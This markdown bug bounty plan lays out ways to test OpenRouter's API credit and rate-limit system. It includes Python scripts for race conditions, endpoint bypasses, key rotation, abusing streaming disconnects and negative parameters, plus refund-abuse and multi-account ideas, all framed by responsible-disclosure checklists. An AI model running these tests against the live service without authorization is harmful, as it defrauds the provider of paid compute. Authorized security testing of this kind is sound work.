# OpenRouter Bug Bounty Research

**Purpose**: Responsible security research for potential vulnerabilities in OpenRouter's credit/rate limit system.

**Contact for Disclosure**: `safety@openrouter.ai` (5 business day response time)

---

## ✅ OpenRouter Has a Bug Bounty Program

From job postings, OpenRouter actively:
- Runs bug bounty programs
- Has a Security Engineer role dedicated to "investigating, triaging and remediating responsible disclosure vulnerabilities"
- Encourages responsible disclosure

**Red Teaming Policy**: https://openrouter.ai/docs/cookbook/evaluate-and-optimize/red-teaming
- Requires prior approval for adversarial testing
- Email `safety@openrouter.ai` with research details

---

## 🔍 Common API Credit System Vulnerabilities (Industry-Wide)

### 1. **TOCTOU Race Condition** (Time-of-Check to Time-of-Use)
**Pattern**: Check → Call → Deduct

**Vulnerability**: Multiple concurrent requests can bypass credit checks because:
1. Request A checks balance (10 credits) ✅
2. Request B checks balance (10 credits) ✅ ← both pass!
3. Request A calls LLM (takes 5 seconds)
4. Request B calls LLM (takes 5 seconds) ← free execution
5. Request A deducts 10 credits (balance = 0)
6. Request B deducts 10 credits (balance = -10) ← negative balance!

**Real-world examples**:
- AutoGPT CVE-2026-45023: Credit bypass via direct block execution
- DraftDeckAI Issue #477: Race condition in credit deduction
- ElizaOS Issue #6338: TOCTOU in streaming endpoints

**Test approach**:
```python
import asyncio
import aiohttp

async def test_race_condition():
    """Send 10 concurrent requests with 1 credit balance"""
    api_key = "sk-or-v1-..."
    
    async def make_request(session):
        async with session.post(
            "https://openrouter.ai/api/v1/chat/completions",
            headers={"Authorization": f"Bearer {api_key}"},
            json={
                "model": "z-ai/glm-4.5v",
                "messages": [{"role": "user", "content": "test"}],
                "max_tokens": 10
            }
        ) as resp:
            return resp.status, await resp.text()
    
    async with aiohttp.ClientSession() as session:
        # Send 10 requests simultaneously
        tasks = [make_request(session) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        
        # Check: did more than 1 request succeed?
        successes = sum(1 for status, _ in results if status == 200)
        print(f"Successes: {successes} (expected: 1, actual: {successes})")
        
        if successes > 1:
            print("⚠️ VULNERABILITY: Race condition detected!")
```

**Expected behavior**: Only 1 request should succeed (atomic deduction)
**Vulnerable behavior**: Multiple requests succeed (negative balance)

---

### 2. **Credit Check Bypass via Direct Endpoint Access**
**Pattern**: Some endpoints skip credit checks entirely

**Vulnerability**: 
- Main API path: `/api/v1/chat/completions` → checks credits ✅
- Internal endpoint: `/api/blocks/{id}/execute` → no credit check ❌

**Test approach**:
```python
# Check if alternative endpoints exist that bypass credit checks
endpoints_to_test = [
    "/api/v1/chat/completions",      # Main endpoint
    "/api/v1/completions",            # Legacy endpoint?
    "/api/blocks/execute",            # Internal endpoint?
    "/api/v1/models/{model}/chat",   # Direct model endpoint?
    "/v1/chat/completions",           # Without /api prefix?
]

for endpoint in endpoints_to_test:
    # Test with 0 credits
    response = requests.post(f"https://openrouter.ai{endpoint}", ...)
    if response.status_code == 200:
        print(f"⚠️ {endpoint} executed with 0 credits!")
```

---

### 3. **Rate Limit Bypass via Key Rotation**
**Known behavior**: OpenRouter explicitly states "Making additional accounts or API keys will not affect your rate limits"

**Existing tool**: https://github.com/Aculeasis/openrouter-proxy
- Rotates multiple API keys in round-robin
- Temporarily disables keys when rate limited
- **Note**: This is NOT a vulnerability if OpenRouter already tracks globally

**Test approach**:
```python
# Test if rate limits are per-key or per-account
keys = ["sk-or-v1-key1", "sk-or-v1-key2", "sk-or-v1-key3"]

for i in range(100):  # Exceed 20 RPM limit
    key = keys[i % len(keys)]  # Rotate keys
    response = requests.post(
        "https://openrouter.ai/api/v1/chat/completions",
        headers={"Authorization": f"Bearer {key}"},
        json={"model": "...", "messages": [...]}
    )
    print(f"Request {i}: {response.status_code}")
```

**Expected**: All keys hit rate limit (global tracking)
**Vulnerable**: Key rotation bypasses rate limit

---

### 4. **Free Model Quota Manipulation**
**Known limits**:
- Free account: 50 requests/day
- After $10 purchase: 1,000 requests/day (permanent)

**Test vectors**:
1. **Refund abuse**: Purchase $10 → get 1000 RPD → refund → still have 1000 RPD?
2. **Multiple accounts**: Create 10 accounts → 500 requests/day total
3. **Failed requests**: Do failed requests count? (OpenRouter docs say YES)

**Test approach**:
```python
# Test if failed requests count against quota
for i in range(60):  # Exceed 50/day limit
    response = requests.post(
        "https://openrouter.ai/api/v1/chat/completions",
        headers={"Authorization": f"Bearer {free_key}"},
        json={
            "model": "invalid-model",  # Force failure
            "messages": [{"role": "user", "content": "test"}]
        }
    )
    print(f"Request {i}: {response.status_code}")
    
# Then try a valid request - does it work?
```

---

### 5. **Credit Balance Manipulation via Negative Deduction**
**Pattern**: Some systems allow negative credit costs

**Test approach**:
```python
# Test if negative max_tokens or other params can ADD credits
response = requests.post(
    "https://openrouter.ai/api/v1/chat/completions",
    headers={"Authorization": f"Bearer {api_key}"},
    json={
        "model": "z-ai/glm-4.5v",
        "messages": [{"role": "user", "content": "test"}],
        "max_tokens": -1000,  # Negative value
    }
)

# Check balance before/after
```

---

### 6. **Streaming Endpoint Credit Bypass**
**Pattern**: Streaming responses may not deduct credits properly

**Vulnerability**: 
- Non-streaming: Deduct credits after full response ✅
- Streaming: Deduct credits... when? If connection drops mid-stream?

**Test approach**:
```python
import requests

response = requests.post(
    "https://openrouter.ai/api/v1/chat/completions",
    headers={"Authorization": f"Bearer {api_key}"},
    json={
        "model": "z-ai/glm-4.5v",
        "messages": [{"role": "user", "content": "Write a 5000 word essay"}],
        "stream": True,
        "max_tokens": 5000
    },
    stream=True
)

# Read first chunk, then disconnect
for i, chunk in enumerate(response.iter_content(chunk_size=1)):
    if i == 100:  # Disconnect after 100 bytes
        response.close()
        break

# Check: were credits deducted for full response or partial?
```

---

### 7. **Provider-Specific Bypass**
**Pattern**: Different providers may have different credit logic

**Test approach**:
```python
# Test if certain providers bypass credit checks
providers = [
    {"provider": {"order": ["DeepInfra"]}},
    {"provider": {"order": ["Together"]}},
    {"provider": {"order": ["Lepton"]}},
    # etc.
]

for provider_config in providers:
    response = requests.post(
        "https://openrouter.ai/api/v1/chat/completions",
        headers={"Authorization": f"Bearer {zero_credit_key}"},
        json={
            "model": "z-ai/glm-4.5v",
            "messages": [{"role": "user", "content": "test"}],
            **provider_config
        }
    )
    if response.status_code == 200:
        print(f"⚠️ Provider {provider_config} bypassed credit check!")
```

---

## 🛠️ Testing Tools

### 1. **Race Condition Tester**
```python
# test_race_condition.py
import asyncio
import aiohttp
import time

async def test_openrouter_race():
    api_key = "sk-or-v1-..."  # Key with 1 credit
    
    async def make_request(session, i):
        start = time.time()
        try:
            async with session.post(
                "https://openrouter.ai/api/v1/chat/completions",
                headers={
                    "Authorization": f"Bearer {api_key}",
                    "Content-Type": "application/json"
                },
                json={
                    "model": "z-ai/glm-4.5v",
                    "messages": [{"role": "user", "content": "Say OK"}],
                    "max_tokens": 10
                }
            ) as resp:
                status = resp.status
                body = await resp.text()
                elapsed = time.time() - start
                return (i, status, elapsed, body[:100])
        except Exception as e:
            return (i, "ERROR", time.time() - start, str(e))
    
    async with aiohttp.ClientSession() as session:
        # Send 20 requests simultaneously
        tasks = [make_request(session, i) for i in range(20)]
        results = await asyncio.gather(*tasks)
        
        successes = [r for r in results if r[1] == 200]
        print(f"\n{'='*60}")
        print(f"RACE CONDITION TEST RESULTS")
        print(f"{'='*60}")
        print(f"Total requests: {len(results)}")
        print(f"Successful (200): {len(successes)}")
        print(f"Expected successes: 1 (if credits = 1)")
        print(f"{'='*60}\n")
        
        if len(successes) > 1:
            print("⚠️  VULNERABILITY DETECTED: Race condition allows multiple requests!")
            print("\nSuccessful requests:")
            for req_id, status, elapsed, body in successes:
                print(f"  Request #{req_id}: {elapsed:.2f}s - {body}")
        else:
            print("✅ No race condition detected (atomic credit deduction)")
        
        return len(successes)

if __name__ == "__main__":
    asyncio.run(test_openrouter_race())
```

### 2. **Credit Balance Monitor**
```python
# monitor_credits.py
import requests
import time

def check_credits(api_key):
    """Check remaining credits on API key"""
    response = requests.get(
        "https://openrouter.ai/api/v1/key",
        headers={"Authorization": f"Bearer {api_key}"}
    )
    data = response.json()
    return {
        "limit": data.get("data", {}).get("limit"),
        "limit_remaining": data.get("data", {}).get("limit_remaining"),
        "limit_reset": data.get("data", {}).get("limit_reset"),
        "usage": data.get("data", {}).get("usage")
    }

# Monitor before/after attack
print("Before:", check_credits("sk-or-v1-..."))
# ... run exploit ...
time.sleep(5)
print("After:", check_credits("sk-or-v1-..."))
```

---

## 📋 Responsible Disclosure Checklist

Before testing:
- [ ] Read OpenRouter's Terms of Service
- [ ] Email `safety@openrouter.ai` for red-teaming approval
- [ ] Use a dedicated test account (not production)
- [ ] Document all findings with timestamps
- [ ] Never exploit for personal gain

During testing:
- [ ] Test on free-tier models only (minimize cost impact)
- [ ] Use low max_tokens (10-50) to reduce resource usage
- [ ] Stop immediately if vulnerability confirmed
- [ ] Take screenshots/logs as evidence

After finding vulnerability:
- [ ] Write detailed report with reproduction steps
- [ ] Include proof-of-concept code (sanitized)
- [ ] Estimate severity (CVSS score)
- [ ] Suggest remediation
- [ ] Email report to `safety@openrouter.ai`
- [ ] Wait for response (5 business days)
- [ ] Do NOT publish publicly until patched

---

## 💰 Potential Bounty Value

Based on industry standards:
- **Low severity** (rate limit bypass): $100-500
- **Medium severity** (credit manipulation): $500-2,000
- **High severity** (unlimited free usage): $2,000-10,000
- **Critical** (account takeover, data breach): $10,000+

---

## 🎯 Most Likely Vulnerabilities (Priority Order)

1. **TOCTOU Race Condition** (HIGH) - Most common in credit systems
2. **Streaming Credit Bypass** (MEDIUM) - Often overlooked
3. **Failed Request Quota Bypass** (LOW) - Easy to test
4. **Provider-Specific Bypass** (MEDIUM) - Complex routing logic
5. **Negative Credit Manipulation** (LOW) - Usually validated

---

## 📝 Report Template

```markdown
# OpenRouter Credit System Vulnerability Report

**Reporter**: [Your Name]
**Date**: [Date]
**Severity**: [Low/Medium/High/Critical]

## Summary
[One-sentence description of vulnerability]

## Vulnerability Details
- **Type**: [TOCTOU / Bypass / Manipulation / etc.]
- **Affected Endpoint**: [URL]
- **Affected Models**: [All / Specific models]
- **Prerequisites**: [Free account / Paid account / etc.]

## Reproduction Steps
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Proof of Concept
```python
[Sanitized code]
```

## Impact
- **User Impact**: [What can an attacker do?]
- **Business Impact**: [Cost to OpenRouter?]
- **Estimated Severity**: [CVSS score]

## Suggested Remediation
[How to fix]

## Timeline
- [Date]: Vulnerability discovered
- [Date]: Report submitted to safety@openrouter.ai
- [Date]: Awaiting response

## Attachments
- [Screenshots]
- [Logs]
- [Video demonstration]
```

---

## ⚠️ Legal & Ethical Notes

**DO**:
- ✅ Get approval before testing
- ✅ Use test accounts only
- ✅ Report responsibly
- ✅ Wait for patch before disclosure

**DON'T**:
- ❌ Exploit for profit
- ❌ Test on production systems without permission
- ❌ Share vulnerabilities publicly before patch
- ❌ Cause service disruption

**Remember**: Bug bounty hunting is about making systems MORE secure, not exploiting them for personal gain.

---

## 🔗 Resources

- OpenRouter Red Teaming Policy: https://openrouter.ai/docs/cookbook/evaluate-and-optimize/red-teaming
- OpenRouter Rate Limits: https://openrouter.ai/docs/api_reference/limits
- OpenRouter FAQ: https://openrouter.ai/docs/faq
- OWASP API Security: https://owasp.org/www-project-api-security/
- HackerOne Disclosure Guidelines: https://www.hackerone.com/disclosure-guidelines
